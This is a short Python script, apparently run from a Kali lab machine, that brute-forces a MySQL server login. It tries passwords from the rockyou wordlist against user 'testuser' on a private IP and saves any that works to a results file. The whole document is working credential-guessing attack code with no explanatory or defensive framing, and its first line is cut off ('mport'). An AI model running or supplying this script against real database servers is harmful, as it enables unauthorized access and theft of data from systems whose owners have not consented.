mport mysql.connector
import time

# Configuration
HOST = "192.168.43.230"           # Target MySQL host
USER = "testuser"                 # MySQL username
PASSWORDS_FILE = "/usr/share/wordlists/rockyou.txt"  # Path to password wordlist
OUTPUT_FILE = "/home/kali/brute_force_results.txt"  # File to save results
MAX_ATTEMPTS = 10               # Max number of attempts

# Initialize counters
attempt_counter = 0

# Open output file
with open(OUTPUT_FILE, "w") as output:
    with open(PASSWORDS_FILE, "r", encoding="utf-8", errors="ignore") as passwords:
        for password in passwords:
            password = password.strip()
            attempt_counter += 1

            # Stop if max attempts have been reached
            if attempt_counter > MAX_ATTEMPTS:
                output.write("[-] Max attempts reached. Stopping.\n")
                print("[-] Max attempts reached. Stopping.")
                break

            try:
                # Attempt connection
                conn = mysql.connector.connect(
                    host=HOST,
                    user=USER,
                    password=password,
                    connection_timeout=5
                )
                output.write(f"[+] Password found: {password}\n")
                print(f"[+] Password found: {password}")
                conn.close()
                break  # Stop on success
            except mysql.connector.Error as err:
                # Handle errors
                pass
